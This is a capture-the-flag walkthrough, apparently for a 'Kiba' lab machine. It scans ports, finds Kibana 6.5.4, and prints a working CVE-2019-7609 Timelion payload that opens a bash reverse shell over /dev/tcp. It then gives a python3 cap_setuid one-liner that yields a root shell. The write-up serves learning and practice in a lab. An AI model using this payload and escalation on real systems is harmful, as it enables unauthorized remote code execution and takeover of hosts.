# Kiba

## Nmap

```
sudo nmap 10.10.176.245 -p- -sS -sV                                           

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
```

Port 80 takes us to the following:

![http://10.10.176.245/index.html](<../../../.gitbook/assets/image (894).png>)

The sentance is a possible hint for later regarding capabilities. Otherwise I was unable to enumerate further interesting directories with Gobuster.

On port 5601 we have Kibana installed.

![http://10.10.176.245:5601/app/kibana#/home?\_g=()](<../../../.gitbook/assets/image (895).png>)

Checking the management pane shows we are running on version 6.5.4

![http://10.10.176.245:5601/app/kibana#/management?\_g=()](<../../../.gitbook/assets/image (896).png>)

Research related exploits we come across a RCE exploit that effect versions prior to 6.6.

{% embed url="https://github.com/mpgn/CVE-2019-7609" %}

As per the exploit head over to the Timelion pane in Kibana and paste the following payload:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Swapping out the IP and port where required.

![](<../../../.gitbook/assets/image (897).png>)

Hit run and then proceed to the 'Canvas' pane. Shortly after we should recieve a shell back on our netcat listener.

![](<../../../.gitbook/assets/image (898).png>)

From here we can check all capabilities with:

```
getcap -r / 2>/dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

This reveals a python binary in /home/kiba/.hackmeplease. We can run the following command to launch a Python shell as root.

```
home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![](<../../../.gitbook/assets/image (899) (1).png>)
